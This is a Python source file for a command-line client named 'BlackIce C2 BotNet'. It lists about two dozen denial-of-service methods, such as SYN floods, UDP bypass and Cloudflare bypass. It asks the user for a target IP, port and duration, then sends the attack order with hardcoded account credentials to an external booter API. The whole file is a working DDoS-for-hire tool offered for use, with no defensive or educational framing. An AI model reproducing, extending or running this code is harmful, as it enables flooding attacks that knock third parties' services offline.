import os
import time
import requests
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama
init(autoreset=True)

# API credentials
USERNAME = "Iamgeo1"
PASSWORD = "5671"
API_ENDPOINT = "https://cypherservices.su/api/attack?username={USERNAME}&secret={PASSWORD}&host={HOST}&time={TIME}&port={PORT}&method={METHOD}"

# List of attack methods
ATTACK_METHODS = [
    "homehold", "synflood", "discord", "telegram", "openvpn", "tcpkill", "tcpmix", "udpgostorm", "ovh",
    "ssh", "tcpboom", "udpbypass", "stun", "mixamp", "homekill", "dns", "game", "fivem", "tls", "http",
    "httpsbypass", "browser", "cfbypass"
]

# Clear screen function
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display menu
def display_menu():
    clear_screen()

    # ASCII Art Title
    title = pyfiglet.figlet_format("BLACKICE", font="epic")
    print(Fore.LIGHTCYAN_EX + title.strip())

    # Welcome Box
    welcome_box = f"""
{Fore.LIGHTCYAN_EX}+{'-'*42}+
| {Fore.WHITE}Welcome to the BlackIce C2 BotNet       {Fore.LIGHTCYAN_EX}|
| {Fore.WHITE}Powered by BlackIce API                   {Fore.LIGHTCYAN_EX}|
+{'-'*42}+
"""
    print(welcome_box.strip())

    print(f"\n{Fore.WHITE}Join the community: {Fore.LIGHTCYAN_EX}https://t.me/BlackIceC2")
    print(f"{Fore.WHITE}Copyright © 2025 BlackIce - All Rights Reserved")
    print(f"{Fore.WHITE}Created by iamgeo1 & mzz")
    print(Fore.LIGHTCYAN_EX + "=" * 50)

# Show help and display attack methods
def show_help():
    print("\n" + Fore.LIGHTCYAN_EX + "+------------------------ COMMANDS ------------------------+")
    print(Fore.YELLOW + "[help]   " + Fore.WHITE + "- Show this help message")
    print(Fore.YELLOW + "[clear]  " + Fore.WHITE + "- Clear the terminal screen")
    print(Fore.YELLOW + "[exit]   " + Fore.WHITE + "- Exit the program")
    print(Fore.LIGHTCYAN_EX + "+---------------------------------------------------------+")

    print("\n" + Fore.LIGHTCYAN_EX + "Available Attack Methods:")
    columns = 3
    for i in range(0, len(ATTACK_METHODS), columns):
        row = []
        for j in range(columns):
            if i + j < len(ATTACK_METHODS):
                method = ATTACK_METHODS[i + j]
                row.append(f"{Fore.YELLOW}[{Fore.GREEN}{i + j + 1}{Fore.YELLOW}] {Fore.WHITE}{method}")
        print("   ".join(row))

# Get user input
def get_input():
    try:
        command = input(Fore.LIGHTCYAN_EX + "[root@BlackIce] ~ " + Fore.GREEN).strip().lower()
        if command == 'help':
            show_help()
        elif command == 'clear':
            clear_screen()
            display_menu()
        elif command == 'exit':
            print(Fore.LIGHTRED_EX + "\n[!] Shutting down BlackIce...")
            exit()
        else:
            try:
                choice = int(command)
                if 1 <= choice <= len(ATTACK_METHODS):
                    method = ATTACK_METHODS[choice - 1]
                    host = input("\n🎯 " + Fore.LIGHTCYAN_EX + "Target (IP/Host): " + Fore.WHITE)
                    port = input("🚪 " + Fore.LIGHTCYAN_EX + "Port: " + Fore.WHITE)
                    time = input("🕒 " + Fore.LIGHTCYAN_EX + "Duration (seconds): " + Fore.WHITE)

                    print("\n🚀 " + Fore.LIGHTGREEN_EX + "Launching attack..." + Fore.WHITE)
                    send_attack(method, host, port, time)
                else:
                    print("\n❌ " + Fore.LIGHTRED_EX + "Invalid selection." + Fore.WHITE)
            except ValueError:
                print("\n❌ " + Fore.LIGHTRED_EX + "Invalid input." + Fore.WHITE)
    except Exception as e:
        print("\n❌ " + Fore.LIGHTRED_EX + f"Error: {e}" + Fore.WHITE)

# Send attack request
def send_attack(method, host, port, duration):
    url = API_ENDPOINT.format(
        USERNAME=USERNAME,
        PASSWORD=PASSWORD,
        HOST=host,
        PORT=port,
        TIME=duration,
        METHOD=method
    )
    response = requests.get(url)

    if response.status_code == 200:
        print(f"\n✅ {Fore.LIGHTGREEN_EX}Booted By BlackIce.... {host}:{port} using {method} for {duration} seconds!")
    else:
        print(f"\n❌ {Fore.LIGHTRED_EX}Error: {response.text}")

    time.sleep(3)
    main()

# Main function
def main():
    display_menu()
    while True:
        get_input()

if __name__ == "__main__":
    main()
